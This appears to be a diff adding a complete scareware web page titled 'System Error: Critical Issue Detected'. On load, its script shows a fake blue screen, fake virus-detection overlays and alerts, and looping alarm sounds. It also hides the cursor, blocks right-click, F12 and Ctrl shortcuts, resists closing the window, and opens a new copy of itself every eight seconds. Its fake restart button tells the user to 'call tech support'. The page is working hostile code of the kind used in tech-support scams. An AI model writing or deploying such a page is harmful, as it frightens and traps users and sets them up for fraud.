@@ -1,1 +1,250 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>System Error: Critical Issue Detected</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    .hidden { display: none; }
+    .shake {
+      animation: shake 0.5s ease-in-out infinite;
+    }
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      50% { transform: translateX(5px); }
+      75% { transform: translateX(-5px); }
+    }
+    .error-text {
+      color: red;
+      font-size: 24px;
+      font-weight: bold;
+    }
+    .flashing {
+      color: #ff0000;
+      animation: flash 0.3s alternate infinite;
+    }
+    @keyframes flash {
+      0% { opacity: 0.2; }
+      100% { opacity: 1; }
+    }
+    #frozenScreen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.9);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: white;
+      font-size: 36px;
+      font-weight: bold;
+      z-index: 9999;
+    }
+    .hidden-cursor {
+      cursor: not-allowed !important;
+    }
+    .full-screen-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 0, 0, 0.7);
+      color: white;
+      font-size: 50px;
+      font-weight: bold;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9998;
+      animation: flash 1s infinite;
+    }
+    #virusScanProgress {
+      width: 0;
+      height: 5px;
+      background-color: red;
+      position: absolute;
+      top: 30%;
+      left: 50%;
+      width: 100%;
+      height: 50px;
+      z-index: 9999;
+    }
+    .alert-box {
+      color: yellow;
+      font-size: 30px;
+      background-color: black;
+      padding: 20px;
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      z-index: 999;
+      border-radius: 5px;
+    }
+    .blinking-text {
+      color: red;
+      animation: blink 1s linear infinite;
+    }
+    @keyframes blink {
+      50% { opacity: 0; }
+    }
+    #blueScreen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: blue;
+      color: white;
+      font-size: 48px;
+      text-align: center;
+      z-index: 9999;
+      display: none;
+    }
+    .fake-button {
+      background-color: red;
+      padding: 10px 20px;
+      border-radius: 10px;
+      color: white;
+      font-size: 20px;
+      margin-top: 20px;
+      cursor: pointer;
+      box-shadow: 0 0 10px rgba(255, 0, 0, 0.6);
+      border: 2px solid red;
+    }
+    .fake-button:hover {
+      background-color: darkred;
+    }
+  </style>
+</head>
+<body class="bg-gray-900 text-white font-sans">
+
+  <!-- Fake System Blue Screen -->
+  <div id="blueScreen">
+    <h1>STOP: SYSTEM CRASHED</h1>
+    <p>The system encountered an error and needs to restart.</p>
+    <p>Press <strong>Ctrl + Alt + Delete</strong> to attempt recovery.</p>
+    <button onclick="restartSystem()" class="fake-button">Restart</button>
+  </div>
+
+  <!-- Full Screen Virus Detection -->
+  <div id="fullScreen" class="full-screen-overlay hidden">VIRUS DETECTED. SYSTEM WILL SHUTDOWN SOON</div>
+
+  <!-- Fake Virus Scan Progress Bar -->
+  <div id="virusScanProgress"></div>
+
+  <!-- Fake Pop-Up Alerts -->
+  <div id="popUpAlert" class="alert-box hidden">CRITICAL ERROR: SYSTEM COMPROMISED. DO NOT TURN OFF YOUR COMPUTER!</div>
+
+  <!-- Fake Frozen Screen -->
+  <div id="frozenScreen" class="hidden">SYSTEM FROZEN. PLEASE DO NOT CLOSE THIS WINDOW!</div>
+
+  <!-- Annoying Sounds -->
+  <audio id="errorSound" loop autoplay>
+    <source src="https://www.soundjay.com/button/beep-03.wav" type="audio/wav">
+  </audio>
+  <audio id="alertSound" loop autoplay>
+    <source src="https://www.soundjay.com/button/beep-07.wav" type="audio/wav">
+  </audio>
+  <audio id="criticalSound" loop autoplay>
+    <source src="https://www.soundjay.com/button/beep-01a.wav" type="audio/wav">
+  </audio>
+
+  <script>
+    // Prevent user from interacting with the page easily
+    document.body.classList.add('hidden-cursor');
+
+    // Fake Blue Screen of Death (BSOD)
+    setTimeout(() => {
+      document.getElementById('blueScreen').style.display = 'block';
+    }, 3000);
+
+    // Fake Virus Scan Progress Bar
+    let progress = 0;
+    let progressInterval = setInterval(() => {
+      if (progress < 100) {
+        progress += Math.random() * 5;
+        document.getElementById('virusScanProgress').style.width = progress + '%';
+      }
+    }, 300);
+
+    // Fake Pop-Up Alerts
+    setInterval(() => {
+      let randomAlert = Math.random() < 0.5 ? 'Critical Error: System compromised!' : 'Warning: Your system is under attack!';
+      document.getElementById('popUpAlert').innerText = randomAlert;
+      document.getElementById('popUpAlert').classList.remove('hidden');
+      setTimeout(() => {
+        document.getElementById('popUpAlert').classList.add('hidden');
+      }, 4000);
+    }, 5000);
+
+    // Freeze the screen after a few seconds
+    setTimeout(() => {
+      document.getElementById('frozenScreen').classList.remove('hidden');
+    }, 7000);
+
+    // Add warning sounds
+    setInterval(() => {
+      const errorSound = Math.random() < 0.5 ? alertSound : criticalSound;
+      errorSound.play();
+    }, 3000);
+
+    // Prevent closing the browser window
+    window.onbeforeunload = function () {
+      return "Are you sure you want to leave? Your system is at risk!";
+    };
+
+    // Simulate the page slowing down
+    setInterval(() => {
+      document.body.style.pointerEvents = 'none';
+      setTimeout(() => {
+        document.body.style.pointerEvents = 'auto';
+      }, 2000);
+    }, 5000);
+
+    // Disable right-click, keyboard shortcuts, and inspect element
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
+    window.addEventListener('keydown', (e) => {
+      if (e.key === 'F12' || e.ctrlKey) e.preventDefault();
+    });
+
+    // Restart system button fake functionality
+    function restartSystem() {
+      alert("System restart initiated... please wait.");
+      setTimeout(() => {
+        alert("Restart failed. Please call tech support.");
+      }, 3000);
+    }
+
+    // Open multiple tabs to confuse the user
+    setInterval(() => {
+      window.open(location.href, "_blank");
+    }, 8000);
+
+    // Trigger random alerts simulating a crash or virus
+    setInterval(() => {
+      const crashAlert = document.createElement('div');
+      crashAlert.style.position = 'absolute';
+      crashAlert.style.top = '50%';
+      crashAlert.style.left = '50%';
+      crashAlert.style.transform = 'translate(-50%, -50%)';
+      crashAlert.style.padding = '20px';
+      crashAlert.style.backgroundColor = 'red';
+      crashAlert.style.color = 'white';
+      crashAlert.style.fontSize = '40px';
+      crashAlert.style.fontWeight = 'bold';
+      crashAlert.innerText = "CRITICAL ERROR: SYSTEM FAILURE!";
+      document.body.appendChild(crashAlert);
+
+      setTimeout(() => {
+        crashAlert.remove();
+      }, 5000);
+    }, 12000);
+  </script>
+</body>
+</html>
